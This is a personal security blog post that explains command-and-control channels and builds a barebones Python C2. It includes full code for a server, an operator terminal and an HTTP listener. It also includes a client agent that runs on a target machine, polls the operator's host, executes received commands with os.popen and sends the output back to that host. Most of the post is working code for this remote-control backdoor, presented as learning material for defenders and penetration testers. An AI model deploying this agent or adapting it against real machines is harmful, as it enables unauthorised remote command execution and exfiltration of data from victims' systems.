---
title: Creating a Barebones C2 Channel
author: kyhle
date: 2021-06-11 12:00:00 +0200
categories: [InfoSec, Technical]
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
image:
  path: /assets/img/c2.jpg
  width: 800
  height: 500

--- 

The phrase "Command and Control (C2)", which has its origins in military terminology, refers to the approach an attacker uses to take command of and exercise control over a compromised system. In the world of malware, C2 is typically used to execute arbitrary commands on a victim system, report the status of a compromise to an attacker, or exfiltrate information. C2 channels may be used to commandeer an individual host or control a botnet of millions of machines.

Attackers use a variety of techniques and protocols for command and control. Internet Relay Chat (IRC), which facilitates group messaging via a client-server model, was a common C2 protocol for many years. However, IRC is rarely used in business environments, so it is easy for defenders to detect this potentially malicious traffic. As a result, attackers consider alternative protocols that allow them to better hide in plain sight. HTTP is an obvious choice because of its prevalence across the corporate enterprise. Additionally, with the introduction of various communication platforms within organizations, an uptick in C2 channels using Teams and Slack has been identified.

There are a lot of free open source post-exploitation toolsets that provide this kind of capability, like Metasploit, Empire, Covenant and many others. This post could be helpful for blue teams or penetration testers who want to become more familiar with how command and control servers function at the most basic level.

## Basic Requirements

A basic C2 should consist of; a server, an agent, and a listener. A basic C2 server should be able to:
* Start and stop listeners
* Generate payloads
* Handle agents and task them

An agent should be able to:
* Download and execute tasks
* Send results
* Persist

A listener should be able to:
* Handle multiple agents
* Host files
* Ensure that communication is encrypted


## Basic Flow
There are lots of different ways you can approach this, so I will just cover one approach

1. Client makes an initial callout (HTTP/S) to the C2 server for instructions
2. Server has no tasks, but keeps requests open
3. Operator creates a task and sends to the client
5. Client executes the instructions and sends the results to the C2 server 
6. Server displays results to the operator

The benefit of this method is that the volume of requests could be super low and there won't be a spike in traffic during any stage of operation since the connection is alive. Of course there are lots of other steps you can incorporate above, but these are what I would say are the basics for client-server C2 communications.

## The Code

Now that you have a very high-level understanding of what a C2 channel is, it's time to get into a very basic Python C2 program. As described above, the C2 will consist of: a server, an agent, a listener, and a client.

### C2 Server
This is going to be responsible for maintaining the command variables, starting terminals, and starting listeners.
```python
# main.py
from threading import *
from terminal import *
import listener
cmd = ''

if __name__ == '__main__':
    # Terminal Functionality
    terminal = Terminal()

    # Create Agent Threads
    terminal_thread = Thread(target = terminal.cmdloop,)
    terminal_thread.start()

    # Web Functionality
    print("Starting Webserver...")
    listener.run()
```

### Terminal
This will take the commands and update the main commands.
```python
# terminal.py

from cmd import Cmd
import main

class Terminal (Cmd):
    # Modify the prompt to be whatever you like
    prompt = '$ > '

    def default(self,args):
        main.cmd = args
```

### Listener
Simple web server and hands out operations. Additionally, this will be responsible for printing output to the terminal.

```python
# listener.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from time import sleep
from urllib.parse import urlparse, unquote_plus, parse_qs

import threading
import main

# Global Variables
IP_Address = ''
Port = 80
Sleep_Timer = .25

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Print IP address of host connecting to your C2 - Remove if too noisy
            print("Connection received from: " + self.client_address[0])

            # A basic call would look like: curl http:ip/output?q=something
            # Change 'output' and 'q' as required
            if 'output' in self.path:
                # Handle Output
                request_url = urlparse(self.path)
                request_param = parse_qs(request_url.query)
                print("")
                for param in request_param['q']:
                    print(param.strip())
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(main.cmd.encode())
                return           
        except:
            # Do nothing
            None

        while main.cmd == '':
            sleep(Sleep_Timer)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(main.cmd.encode())
        main.cmd = ''

    # Remove Request Default Information
    def log_message(self, format, *args):
        return

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def run():
    http = ThreadingSimpleServer( (IP_Address, Port), Handler)
    http.serve_forever()

```

### Client
This will be the "payload" / web cradle that is delivered to the host that you want to exploit. It will need to be run on the target machine, and from there, you will be able to run commands through `main.py` on your host and receive feedback through the C2 channel.

```python
# client.py
import requests
import os
import warnings
warnings.filterwarnings("ignore", category=RuntimeWarning) 

from time import sleep

# Global Variables
IP_Address = ''
Sleep_Timer = .25

while True:
    r = requests.get("http://" + IP_Address)
    output = os.popen(r.text, 'r', 1)
    payload = { 'q': output }

    # Preferrable to change to POST to remove likelihood of detection and limit length being exceeded
    requests.get("http://" + IP_Address + "/output", params = payload)
    sleep(Sleep_Timer)
```

As a final step, you will need to run `sudo python3 main.py` on your host to start the C2 server and `python3 client.py` on the target machine in order to establish the connection.

## Conclusion

This post was meant to be a starting point for others who are looking to learn more about C2. The basic channel described in this post wouldn't be great for penetration testing purposes and since the channel used was HTTP using GET methods, it would be very easy to view the commands issued to and from the agents. Remember, any identified C2 channels serve as helpful indicators of compromise (IoCs) that can be used to detect other instances of the same or similar malware. IoCs related to C2 include domain names, IP addresses, protocols, and even patterns of bytes seen in network communications, which could represent commands or encoded data.

I hope you had fun reading this post (and potentially creating your own C2). As always, if you have any questions or recommendations, feel free to reach out!